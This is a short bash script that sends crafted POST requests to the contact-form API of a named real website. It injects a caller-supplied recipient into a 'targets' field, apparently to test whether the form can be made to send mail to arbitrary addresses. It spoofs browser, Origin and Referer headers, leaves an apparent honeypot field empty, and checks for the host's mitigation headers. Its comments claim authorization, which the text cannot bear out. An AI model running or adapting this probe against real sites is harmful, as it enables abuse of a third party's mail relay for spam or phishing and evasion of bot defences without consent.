#!/bin/bash
# Independent verifier probe: POST /api/send on in-scope target
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
RCPT="$1"; LBL="$2"
TOK="vrf$(head -c 9 /dev/urandom | base64 | tr -c 'a-zA-Z0-9' '' | cut -c1-10)"
echo "### $LBL  target=$RCPT token=$TOK"
curl -s -o "/tmp/$LBL.body" -D "/tmp/$LBL.hdr" -w "HTTP:%{http_code} len:%{size_download}\n" -X POST "https://www.infinitycapital.bh/api/send" \
  -A "$UA" -H "Origin: https://www.infinitycapital.bh" -H "Referer: https://www.infinitycapital.bh/contact" \
  -F "fname=Independent" -F "lname=Verifier" -F "areacode=+973" -F "tel=36000000" \
  -F "cname=SecCheck" -F "subject=Partnership Inquiries" \
  -F "msg=Authorized security verification $TOK please disregard." \
  -F "check=" -F "targets=$RCPT" --max-time 45
echo "--- status line ---"; head -1 "/tmp/$LBL.hdr"
grep -iE "^(x-vercel-mitigated|content-type|server|x-vercel-id)" "/tmp/$LBL.hdr"
echo "--- body ---"; cat "/tmp/$LBL.body"; echo; echo
